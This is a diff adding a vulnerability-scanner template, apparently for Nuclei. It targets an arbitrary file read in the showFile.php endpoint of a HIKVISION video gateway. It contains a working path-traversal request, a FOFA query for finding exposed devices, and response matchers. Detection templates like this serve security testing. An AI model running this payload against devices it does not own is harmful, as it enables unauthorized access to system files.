@@ -1,0 +1,26 @@
+id: hikvision-video-gateway-fileread
+
+info:
+  name: HIKVISION 视频编码设备接入网关 showFile.php - 任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - https://mp.weixin.qq.com/s/QA5Wssyrjf3exQbPtK4Hrw
+  metadata:
+    verified: true
+    fofa-query: title="视频编码设备接入网关"
+  tags: hikvision,fileread,videogateway
+
+http:
+  - raw:
+      - |
+        GET /serverLog/showFile.php?fileName=../web/html/main.php HTTP/1.1
+        Host: {{Hostname}}
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,"_SERVER","userName")
+        condition: and
